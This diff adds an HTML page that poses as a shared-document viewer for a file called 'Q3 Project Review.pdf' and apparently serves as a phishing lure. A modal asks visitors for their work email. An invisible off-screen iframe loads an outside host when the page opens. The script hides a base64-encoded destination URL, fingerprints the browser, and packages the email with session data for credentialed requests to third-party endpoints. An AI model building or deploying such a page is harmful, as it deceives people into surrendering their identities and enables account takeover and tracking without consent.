@@ -1,0 +1,362 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Workspace Documents</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      background: #f8fafc;
+      color: #1e293b;
+    }
+
+    header {
+      height: 64px;
+      background: #fff;
+      border-bottom: 1px solid #e2e8f0;
+      display: flex;
+      align-items: center;
+      padding: 0 32px;
+    }
+
+    .logo {
+      width: 32px;
+      height: 32px;
+      background: #2563eb;
+      border-radius: 8px;
+      margin-right: 12px;
+    }
+
+    .brand {
+      font-weight: 650;
+      font-size: 16px;
+    }
+
+    main {
+      max-width: 960px;
+      margin: 50px auto;
+      padding: 0 24px;
+    }
+
+    .breadcrumb {
+      font-size: 13px;
+      color: #64748b;
+      margin-bottom: 20px;
+    }
+
+    .document {
+      background: #fff;
+      border: 1px solid #e2e8f0;
+      border-radius: 12px;
+      overflow: hidden;
+    }
+
+    .document-header {
+      padding: 25px 28px;
+      border-bottom: 1px solid #e2e8f0;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    h1 {
+      font-size: 19px;
+      margin: 0 0 5px;
+    }
+
+    .meta {
+      font-size: 13px;
+      color: #64748b;
+    }
+
+    .file-icon {
+      width: 42px;
+      height: 48px;
+      border-radius: 5px;
+      background: #eff6ff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #2563eb;
+      font-size: 11px;
+      font-weight: 700;
+    }
+
+    .preview {
+      height: 290px;
+      padding: 45px 60px;
+      background: #f1f5f9;
+    }
+
+    .page {
+      max-width: 580px;
+      height: 200px;
+      margin: auto;
+      background: white;
+      padding: 28px;
+      box-shadow: 0 2px 8px rgba(15,23,42,.08);
+    }
+
+    .line {
+      height: 7px;
+      background: #e2e8f0;
+      margin-bottom: 12px;
+      border-radius: 4px;
+    }
+
+    .line.short {
+      width: 60%;
+    }
+
+    .actions {
+      padding: 24px 28px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .note {
+      font-size: 13px;
+      color: #64748b;
+    }
+
+    button {
+      background: #2563eb;
+      color: white;
+      border: 0;
+      border-radius: 7px;
+      padding: 11px 20px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .modal {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(15,23,42,.38);
+      align-items: center;
+      justify-content: center;
+    }
+
+    .modal-card {
+      width: 370px;
+      background: white;
+      border-radius: 12px;
+      padding: 27px;
+      box-shadow: 0 20px 60px rgba(0,0,0,.15);
+    }
+
+    .modal-card h2 {
+      margin: 0 0 8px;
+      font-size: 18px;
+    }
+
+    .modal-card p {
+      color: #64748b;
+      font-size: 13px;
+      line-height: 1.5;
+    }
+
+    input {
+      width: 100%;
+      padding: 11px;
+      margin-top: 10px;
+      border: 1px solid #cbd5e1;
+      border-radius: 6px;
+    }
+
+    .modal-card button {
+      width: 100%;
+      margin-top: 15px;
+    }
+
+    #telemetry {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      overflow: hidden;
+      opacity: .001;
+      left: -10000px;
+    }
+  </style>
+</head>
+
+<body>
+
+<header>
+  <div class="logo"></div>
+  <div class="brand">Workspace</div>
+</header>
+
+<main>
+  <div class="breadcrumb">
+    Shared files / Project documents
+  </div>
+
+  <section class="document">
+
+    <div class="document-header">
+      <div>
+        <h1>Q3 Project Review.pdf</h1>
+        <div class="meta">
+          2.8 MB · Shared yesterday
+        </div>
+      </div>
+
+      <div class="file-icon">PDF</div>
+    </div>
+
+    <div class="preview">
+      <div class="page">
+        <div class="line short"></div>
+        <div class="line"></div>
+        <div class="line"></div>
+        <div class="line short"></div>
+        <br>
+        <div class="line"></div>
+        <div class="line"></div>
+        <div class="line short"></div>
+      </div>
+    </div>
+
+    <div class="actions">
+      <div class="note">
+        Sign in to view comments and document history.
+      </div>
+
+      <button id="openDocument">
+        Open document
+      </button>
+    </div>
+
+  </section>
+</main>
+
+<div class="modal" id="accessModal">
+  <div class="modal-card">
+    <h2>Continue to Workspace</h2>
+
+    <p>
+      Enter your work email to open the shared document.
+    </p>
+
+    <form id="accessForm">
+      <input
+        type="email"
+        name="identity"
+        placeholder="name@company.com"
+        autocomplete="email"
+        required>
+
+      <button type="submit">
+        Continue
+      </button>
+    </form>
+  </div>
+</div>
+
+<div id="telemetry">
+  <iframe
+    src="https://workspace-session-demo.vercel.app/init"
+    width="1"
+    height="1">
+  </iframe>
+</div>
+
+<script>
+const config = {
+  version: "4.8.2",
+  region: "eu-central",
+  session: Math.random().toString(36).slice(2),
+  endpoints: {
+    primary: "https://document-edge-demo.netlify.app/api/session",
+    secondary: "https://workspace-gateway-demo.vercel.app/connect",
+    storage: "https://workspace-cache-demo.s3.amazonaws.com/session"
+  }
+};
+
+const encoded =
+  "aHR0cHM6Ly9kb2N1bWVudC1lZGdlLWRlbW8ubmV0bGlmeS5hcHAvYXBpL2NvbnRpbnVl";
+
+const destination = atob(encoded);
+
+const modal = document.getElementById("accessModal");
+const trigger = document.getElementById("openDocument");
+const form = document.getElementById("accessForm");
+
+trigger.addEventListener("click", () => {
+  modal.style.display = "flex";
+  history.replaceState(
+    {},
+    "",
+    location.pathname + "?document=Q3-Project-Review"
+  );
+});
+
+form.addEventListener("submit", event => {
+  event.preventDefault();
+
+  const data = new FormData(form);
+  const identity = data.get("identity");
+
+  const session = {
+    identity: identity,
+    token: config.session,
+    source: document.referrer,
+    language: navigator.language,
+    timezone:
+      Intl.DateTimeFormat().resolvedOptions().timeZone,
+    screen: [
+      window.screen.width,
+      window.screen.height
+    ].join("x"),
+    endpoint: destination
+  };
+
+  sessionStorage.setItem(
+    "workspace_session",
+    btoa(JSON.stringify(session))
+  );
+
+  modal.innerHTML = `
+    <div class="modal-card">
+      <h2>Opening document</h2>
+      <p>The document viewer is being prepared.</p>
+    </div>
+  `;
+});
+
+const runtime = {
+  request: {
+    url: config.endpoints.primary,
+    method: "POST",
+    credentials: "include"
+  },
+  navigation: {
+    destination: destination,
+    fallback: config.endpoints.secondary
+  },
+  fingerprint: {
+    platform: navigator.platform,
+    language: navigator.language,
+    width: screen.width,
+    height: screen.height
+  }
+};
+
+localStorage.setItem(
+  "_workspace_runtime",
+  JSON.stringify(runtime)
+);
+</script>
+
+</body>
+</html>
